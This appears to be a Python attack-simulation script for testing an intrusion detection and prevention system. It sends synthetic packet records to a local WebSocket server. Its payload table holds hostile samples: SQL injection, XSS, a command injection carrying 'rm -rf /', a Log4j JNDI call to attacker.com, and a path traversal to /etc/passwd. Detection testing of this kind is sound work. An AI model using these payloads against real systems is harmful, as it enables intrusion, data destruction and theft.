#!/usr/bin/env python3
"""
Attack Simulation Script
This script simulates various network attacks for testing the Enhanced IDS/IPS System.
"""

import asyncio
import json
import random
import time
import websockets
import argparse
import logging
from typing import Dict, List, Any, Optional
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class AttackSimulator:
    def __init__(self, server_uri: str, attack_types: List[str], duration: int, rate: int):
        """
        Initialize the attack simulator.
        
        Args:
            server_uri: WebSocket server URI
            attack_types: List of attack types to simulate
            duration: Duration of simulation in seconds
            rate: Attack rate (packets per second)
        """
        self.server_uri = server_uri
        self.attack_types = attack_types
        self.duration = duration
        self.rate = rate
        self.running = False
        
        # Attack patterns
        self.attack_patterns = {
            "sql_injection": {
                "payload": "GET /search?q=' OR '1'='1' -- HTTP/1.1\r\nHost: example.com",
                "description": "SQL Injection attack attempting to bypass authentication"
            },
            "xss": {
                "payload": "GET /search?q=<script>alert('XSS')</script> HTTP/1.1\r\nHost: example.com",
                "description": "Cross-Site Scripting attack attempting to inject malicious script"
            },
            "command_injection": {
                "payload": "GET /ping?ip=127.0.0.1; rm -rf / HTTP/1.1\r\nHost: example.com",
                "description": "Command Injection attack attempting to execute system commands"
            },
            "log4j": {
                "payload": "GET /login?user=${jndi:ldap://attacker.com/exploit} HTTP/1.1\r\nHost: example.com",
                "description": "Log4j vulnerability exploit attempt"
            },
            "path_traversal": {
                "payload": "GET /file?name=../../../etc/passwd HTTP/1.1\r\nHost: example.com",
                "description": "Path Traversal attack attempting to access sensitive files"
            },
            "ddos": {
                "payload": "GET / HTTP/1.1\r\nHost: example.com",
                "description": "DDoS attack with high volume of requests"
            },
            "brute_force": {
                "payload": "POST /login HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin&password=password123",
                "description": "Brute force attack attempting to guess credentials"
            },
            "port_scan": {
                "payload": "SYN scan to multiple ports",
                "description": "Port scanning attempt to discover open ports"
            }
        }
        
        # Malicious IP addresses
        self.malicious_ips = [
            "203.0.113.45", "198.51.100.77", "192.0.2.123", 
            "203.0.113.88", "198.51.100.99", "192.0.2.200",
            "203.0.113.33", "198.51.100.44", "192.0.2.55"
        ]
        
        # Target IP addresses
        self.target_ips = [
            "10.0.1.10", "10.0.1.11", "10.0.1.12",
            "10.0.2.10", "10.0.2.11", "10.0.2.12"
        ]
        
        # Network paths
        self.network_paths = [
            ["router-1", "fw-1", "switch-1", "web-01"],
            ["router-1", "fw-1", "switch-2", "web-02"],
            ["router-2", "fw-2", "switch-3", "db-01"],
            ["router-2", "fw-2", "switch-4", "app-01"]
        ]
        
    async def connect(self):
        """Connect to the WebSocket server."""
        try:
            self.websocket = await websockets.connect(self.server_uri)
            logger.info(f"Connected to WebSocket server: {self.server_uri}")
            return True
        except Exception as e:
            logger.error(f"Failed to connect to WebSocket server: {e}")
            return False
            
    async def disconnect(self):
        """Disconnect from the WebSocket server."""
        if hasattr(self, 'websocket') and self.websocket:
            await self.websocket.close()
            logger.info("Disconnected from WebSocket server")
            
    def generate_attack_packet(self, attack_type: str) -> Dict[str, Any]:
        """
        Generate a packet for a specific attack type.
        
        Args:
            attack_type: Type of attack to simulate
            
        Returns:
            Dictionary representing the attack packet
        """
        if attack_type not in self.attack_patterns:
            logger.warning(f"Unknown attack type: {attack_type}")
            attack_type = random.choice(list(self.attack_patterns.keys()))
            
        pattern = self.attack_patterns[attack_type]
        
        # Select random source and target IPs
        source_ip = random.choice(self.malicious_ips)
        target_ip = random.choice(self.target_ips)
        
        # Select random network path
        path = random.choice(self.network_paths)

        protocol = "TCP"
        flags = random.choice(["S", "PA", "A", "F", "R", ""])
        header_len = 20
        src_port = random.randint(1024, 65535)
        dst_port = random.choice([80, 443, 22, 21, 25, 53, 3389])
        payload_len = len(pattern["payload"]) if pattern.get("payload") else 0
        size = max(60, header_len + payload_len)
        
        # Create packet data
        packet_data = {
            "timestamp": int(time.time()),
            "source_ip": source_ip,
            "dest_ip": target_ip,
            "protocol": "TCP",
            "src_port": src_port,
            "dst_port": dst_port,
            "size": size,
            "flags": flags,
            "header_len": header_len,
            "payload_len": payload_len,
            "payload": pattern["payload"],
            "attack_types": [attack_type],
            "confidence": random.uniform(0.7, 0.95),
            "description": pattern["description"],
            "sensor_location": random.choice(["edge", "internal"]),
            "path": path,
            "area_of_effect": {
                "nodes": [path[-1]],  # Last node in path is the target
                "radius": random.randint(1, 3)
            },
            "attacker_node": path[0],  # First node in path is the entry point
            "target_node": path[-1],  # Last node in path is the target
            "targeted_data": random.choice([
                ["user_data"],
                ["credentials"],
                ["financial_data"],
                ["personal_info"],
                ["system_config"]
            ])
        }
        
        return packet_data
        
    async def send_packet(self, packet_data: Dict[str, Any]):
        """
        Send a packet to the WebSocket server.
        
        Args:
            packet_data: Packet data to send
        """
        try:
            await self.websocket.send(json.dumps(packet_data))
            logger.debug(f"Sent packet: {packet_data['attack_types'][0]} from {packet_data['source_ip']}")
        except Exception as e:
            logger.error(f"Error sending packet: {e}")
            
    async def run(self):
        """Run the attack simulation."""
        logger.info(f"Starting attack simulation for {self.duration} seconds at {self.rate} packets/second")
        logger.info(f"Attack types: {', '.join(self.attack_types)}")
        
        self.running = True
        start_time = time.time()
        packets_sent = 0
        
        try:
            while self.running and (time.time() - start_time) < self.duration:
                # Select random attack type
                attack_type = random.choice(self.attack_types)
                
                # Generate attack packet
                packet_data = self.generate_attack_packet(attack_type)
                
                # Send packet
                await self.send_packet(packet_data)
                packets_sent += 1
                
                # Calculate delay based on rate
                delay = 1.0 / self.rate
                
                # Wait for next packet
                await asyncio.sleep(delay)
                
        except KeyboardInterrupt:
            logger.info("Attack simulation interrupted by user")
        finally:
            self.running = False
            elapsed = time.time() - start_time
            logger.info(f"Attack simulation completed. Sent {packets_sent} packets in {elapsed:.2f} seconds")
            logger.info(f"Average rate: {packets_sent / elapsed:.2f} packets/second")

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="Simulate network attacks for testing IDS/IPS")
    
    parser.add_argument(
        "--server", 
        default="ws://localhost:8000/ws",
        help="WebSocket server URI (default: ws://localhost:8000/ws)"
    )
    
    parser.add_argument(
        "--attacks",
        nargs="+",
        default=["sql_injection", "xss", "ddos"],
        choices=list(AttackSimulator(None, None, None, None).attack_patterns.keys()),
        help="List of attack types to simulate"
    )
    
    parser.add_argument(
        "--duration",
        type=int,
        default=60,
        help="Duration of simulation in seconds (default: 60)"
    )
    
    parser.add_argument(
        "--rate",
        type=int,
        default=10,
        help="Attack rate in packets per second (default: 10)"
    )
    
    return parser.parse_args()

async def main():
    """Main function."""
    args = parse_arguments()
    
    # Create attack simulator
    simulator = AttackSimulator(
        server_uri=args.server,
        attack_types=args.attacks,
        duration=args.duration,
        rate=args.rate
    )
    
    # Connect to server
    if not await simulator.connect():
        logger.error("Failed to connect to server. Exiting.")
        return 1
    
    try:
        # Run simulation
        await simulator.run()
        return 0
    except Exception as e:
        logger.error(f"Error during simulation: {e}")
        return 1
    finally:
        # Disconnect from server
        await simulator.disconnect()

if __name__ == "__main__":
    exit_code = asyncio.run(main())
    exit(exit_code)
